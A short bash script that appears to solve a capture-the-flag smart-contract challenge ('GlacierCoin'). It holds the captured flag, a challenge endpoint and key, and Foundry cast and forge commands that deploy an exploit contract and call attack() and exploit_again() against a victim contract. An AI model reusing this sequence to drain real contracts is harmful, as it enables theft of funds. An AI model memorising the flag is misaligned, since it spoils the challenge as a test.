#! /bin/bash

# Test file 
# ticket 89286922467
# flag gctf{Glac13r_cO1n_i5_g0Ing_t0_th3_m0on_4nd_b3y0nd}

# forge test --match path test/Counter.t.sol


# Create contract 

RPC_URL="http://34.159.107.195:18545/e40f32b2-2741-4d49-9049-ad909e82a7cc"
PRIVATE_KEY="0xf474ad838cfdf38c17ae6a89f0737fff6157347273d23ba2ef92388fda006ba0"
MY_ADDRESS=""
VALUE="10 ether"
SETUP_CONTRACT="0xcd5894a06e3b198C3abB49aFCbB272Bb3D95B464"
VICTIM_ADDRESS="0x4CB79104F900461A2D26361e610091E761e1f6b6"
EXPLOIT_CONTRACT="0x1abeB4c3409F941a832359B855484cFe6686FaA8"

# cast call $SETUP_CONTRACT "TARGET()(address)" --rpc-url $RPC_URL --private-key $PRIVATE_KEY

# forge create --rpc-url $RPC_URL --private-key $PRIVATE_KEY src/GlacierCoinExploit.sol:GlacierCoinExploit --constructor-args $VICTIM_ADDRESS

MY_ADDRESS=$(cast wallet address --private-key $PRIVATE_KEY)
cast balance --rpc-url $RPC_URL $MY_ADDRESS
cast balance --rpc-url $RPC_URL $VICTIM_ADDRESS


cast send $EXPLOIT_CONTRACT "attack()()" --value "10ether" --rpc-url $RPC_URL --private-key $PRIVATE_KEY

cast send $EXPLOIT_CONTRACT "exploit_again()()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY



